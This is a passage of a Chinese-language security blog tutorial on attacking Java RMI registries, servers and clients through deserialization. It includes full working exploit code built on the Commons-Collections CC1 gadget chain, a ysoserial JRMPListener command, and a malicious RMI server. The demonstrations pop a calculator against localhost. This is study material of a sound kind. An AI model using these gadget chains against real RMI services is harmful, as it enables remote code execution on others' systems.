class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br><span class="hljs-keyword">import</span> java.rmi.Remote;  <br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;  <br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackRegistryEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);  <br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) CC1();  <br>        <span class="hljs-comment">//Proxy.newProxyInstance(...)：创建一个动态代理（JDK 动态代理），使之实现 Remote 接口并使用上面得到的 handler 来处理方法调用</span><br>        <span class="hljs-comment">//这一步的作用是把构造的对象包装成 Remote 类型，以便能作为 bind 的第二个参数</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Remote.class &#125;, handler));  <br>        <span class="hljs-comment">//向目标 RMI registry 发送请求，触发反序列化</span><br>        registry.bind(<span class="hljs-string">&quot;sTring&quot;</span>,remote);  <br>    &#125;  <br>    <br><span class="hljs-comment">//下面就是以前分析过的 CC1 链 （TransformedMap 版  ）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">CC1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);  <br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br>        constructor.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);  <br>        <span class="hljs-keyword">return</span> o;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>首先导入 commons-collections 3.2.1</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>需要注意，服务端和攻击端的项目应一致——都是 maven ，否则攻击无效；如果不在一个项目，都要添加 commons-collections 依赖。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250809034.png"></p><p>rebind  和 bind 一样，不再赘述。</p><h4 id="4-1-2-lookup-unbind"><a href="#4-1-2-lookup-unbind" class="headerlink" title="4.1.2 lookup&amp;unbind"></a>4.1.2 lookup&amp;unbind</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>String var98;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    <span class="hljs-comment">//读取输入流传来的 var98 并反序列化，这里对应的应该是 lookup 参数</span><br>    var98 = (String)var104.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br><span class="hljs-comment">//这里调用注册表查找对象，返回 Remote 类型并放在 var101</span><br><span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>    var9.writeObject(var101);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103446.png"></p><p>lookup 只能传入一个 String 类型</p><p>分析 lookup 的功能，然后伪造 lookup 代码，达到目的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Remote <span class="hljs-title function_">lookup</span><span class="hljs-params">(String var1)</span> <span class="hljs-keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//newCll 构造远程调用对象</span><br>            <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">//序列化lookup 传入的输入流</span><br>                <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>                var3.writeObject(var1);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var18) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var18);<br>            &#125;<br><br>            <span class="hljs-comment">//把上面序列化后的调用真正发往远端、执行远端方法。此处是把 lookup(var1) 请求发送到 RMI 服务器端并等待响应。</span><br>            <span class="hljs-built_in">super</span>.ref.invoke(var2);<br><br>            Remote var23;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                var23 = (Remote)var6.readObject();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var15) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var15);<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var16) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var16);<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-built_in">super</span>.ref.done(var2);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> var23;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103011.png"></p><p>调用 invoke 后就到了客户端请求注册中心的流程：<img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103562.png"></p><h5 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h5><p>在 bind 的基础上修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.attack;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> sun.rmi.server.UnicastRef;<br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.rmi.server.Operation;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteCall;<br><span class="hljs-keyword">import</span> java.rmi.server.RemoteObject;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AttackRegistryEXP02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//通过反射拿到 UnicastRef</span><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;java.rmi.server.RemoteObject&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;ref&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> (UnicastRef) field.get(registry);<br><br>        <span class="hljs-comment">//从这里开始模拟 lookup 的方式进行伪造方法调用</span><br>        <span class="hljs-comment">//这里手动构建了一次 Registry 远程调用</span><br>        Operation[] operations = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br>        <span class="hljs-comment">//获取调用的输出流</span><br>        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br>        <span class="hljs-comment">//序列化</span><br>        var3.writeObject(CC1());<br>        <span class="hljs-comment">//这里执行远程调用触发漏洞</span><br>        ref.invoke(var2);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">CC1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103340.png"></p><h3 id="4-2-攻击客户端"><a href="#4-2-攻击客户端" class="headerlink" title="4.2 攻击客户端"></a>4.2 攻击客户端</h3><h4 id="4-2-1-注册中心攻击客户端"><a href="#4-2-1-注册中心攻击客户端" class="headerlink" title="4.2.1 注册中心攻击客户端"></a>4.2.1 注册中心攻击客户端</h4><blockquote><p>除了 unbind 和 rebind 都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial 的 JRMPListener，因为 EXP 实在太长了。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103591.png"></p><p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099  CommonsCollections1 &#39;calc&#39;</code></p><p>客户端去访问：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br>        registry.list();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是运行完什么都没有发生。。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104922.png"></p><h5 id="后续发现俩个问题，"><a href="#后续发现俩个问题，" class="headerlink" title="后续发现俩个问题，"></a>后续发现俩个问题，</h5><h6 id="一是-Java-版本"><a href="#一是-Java-版本" class="headerlink" title="一是 Java 版本"></a>一是 Java 版本</h6><p>如果是用CC1链，Java版本低于 1.8.0_65</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104627.png"></p><p>当然，高版本可以用 CC6 链绕过也是可以的</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104501.png"></p><h6 id="二是运行计算器时因为加了-单引号-‘’-而找不到程序"><a href="#二是运行计算器时因为加了-单引号-‘’-而找不到程序" class="headerlink" title="二是运行计算器时因为加了 单引号 ‘’ 而找不到程序"></a>二是运行计算器时因为加了 单引号 ‘’ 而找不到程序</h6><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104209.png"></p><p>运行 <code>calc</code> <code>&quot;calc&quot;</code> 都可以正常弹出</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104888.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242104542.png"></p><p><strong>根据 AI 的解释：在Windows系统中，cmd 命令行参数的单引号不会被自动去除，而是作为参数的一部分传递。当ysoserial尝试执行命令时，它接收到的是带单引号的 <code>&#39;calc&#39;</code>，而不是单纯的 <code>calc</code>。当我们换成 power shell 时，是可以正确执行的。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251941223.png" alt="img"></p><h4 id="4-2-2-服务端攻击客户端"><a href="#4-2-2-服务端攻击客户端" class="headerlink" title="4.2.2 服务端攻击客户端"></a>4.2.2 服务端攻击客户端</h4><p>服务端攻击客户端，可分俩种情形：</p><ol><li><font style="color:rgb(80, 80, 92);">服务端返回Object对象</font></li><li><font style="color:rgb(80, 80, 92);">远程加载对象</font></li></ol><h5 id="服务端返回Object对象"><a href="#服务端返回Object对象" class="headerlink" title="服务端返回Object对象"></a><font style="color:rgb(80, 80, 92);">服务端返回Object对象</font></h5><p>RMI 远程方法调用返回的不一定是一个基础数据类型（比如String  int），也会返回一个对象。服务端返回给客户端一个对象，客户端要对这个对象反序列化。所以我们伪造一个服务端，当客户端调用某个方法时，返回的就是恶意对象，就可以攻击客户端。</p><p>User 接口，返回 Object 对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">java</span>.rmi.Remote &#123;<br>    Object <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception;<br>&#125;<br></code></pre></td></tr></table></figure><p>服务端实现 User 接口，返回 CC1 恶意 Object 对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServerReturnObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">User</span>  &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ServerReturnObject</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title 